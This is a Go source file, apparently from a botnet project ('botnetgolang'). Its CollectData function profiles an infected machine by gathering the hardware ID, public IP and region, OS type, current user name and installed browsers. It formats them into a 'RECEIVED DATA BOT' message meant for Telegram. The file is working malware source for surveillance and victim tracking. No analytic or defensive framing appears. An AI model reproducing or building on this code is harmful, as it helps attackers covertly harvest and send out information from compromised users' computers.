package pkg

import (
	"botnetgolang/internal/model"
	"encoding/json"
	"fmt"
	"github.com/denisbrodbeck/machineid"
	"github.com/matishsiao/goInfo"
	"os/user"
)

func CollectData() *model.MessageTelegram {
	var message_telegram model.MessageTelegram
	// get now time

	message_telegram.BotType = " 👽" + "Bot cua a Hau" + "👽"

	// get hardware id
	hwid, _ := machineid.ID()
	message_telegram.ReceivedDataBot = "🤖" + "RECEIVED DATA BOT -" + hwid + "🤖"

	// get ip address
	network_infomation_byte := GetOSName()
	network_infomation_map := make(map[string]string)
	_ = json.Unmarshal(network_infomation_byte, &network_infomation_map)
	message_telegram.IPAddress = "🌐" + "IP Address -" + network_infomation_map["ip"] + "🌐"

	operating_system, _ := goInfo.GetInfo()
	os_type := operating_system.GoOS
	message_telegram.WindowVersion = "💻" + "OS: " + os_type + "💻"

	currentUser, _ := user.Current()
	message_telegram.UserName = "🤶" + currentUser.Name + "🤶"

	message_telegram.Country = "🌏" + network_infomation_map["region"] + network_infomation_map["emoji_flag"] + "🌏"
	number, list_browser := GetBrowser()
	browsers := fmt.Sprintf("%v %v", number, list_browser)
	message_telegram.Browser = "🖥" + browsers + "🖥"

	return &message_telegram
}
